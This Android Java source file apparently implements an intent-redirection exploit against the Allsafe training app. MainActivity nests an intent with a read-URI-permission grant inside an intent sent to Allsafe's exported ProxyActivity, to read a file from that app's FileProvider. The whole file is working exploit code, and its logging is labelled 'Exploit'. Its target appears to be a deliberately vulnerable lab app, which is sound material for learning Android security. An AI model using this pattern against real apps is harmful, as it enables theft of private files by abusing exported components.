package com.example.apackage;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    private TextView logTextView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Find the TextView to display log messages
        logTextView = findViewById(R.id.logTextView);

        // Log a message to show the app is starting
        updateLog("App started.");

        // Create an intent, set permission & pass to DataFetch via ProxyActivity
        Intent embeddedIntent = new Intent();
        embeddedIntent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        embeddedIntent.setComponent(new ComponentName("com.example.apackage", "com.example.apackage.DataFetch"));

        // Set the URI to the content provider
        Uri fileUri = Uri.parse("content://infosecadventures.allsafe.fileprovider/files/docs/readme.txt");
        embeddedIntent.setData(fileUri);

        // Log the URI to display on the screen
        updateLog("Attempting to access URI: " + fileUri.toString());

        // Create the outer intent to pass the embedded intent to ProxyActivity
        Intent outerIntent = new Intent();
        outerIntent.setComponent(new ComponentName("infosecadventures.allsafe", "infosecadventures.allsafe.ProxyActivity"));
        outerIntent.putExtra("extra_intent", embeddedIntent);

        try {
            // Start ProxyActivity, which will forward the embedded intent
            startActivity(outerIntent);
            updateLog("ProxyActivity started successfully.");
        } catch (Exception e) {
            Log.e("Exploit", "Failed to trigger ProxyActivity");
        }
    }

    // Method to update the TextView with new log messages
    private void updateLog(String s) {
        logTextView.append(s + "\n");
    }
}
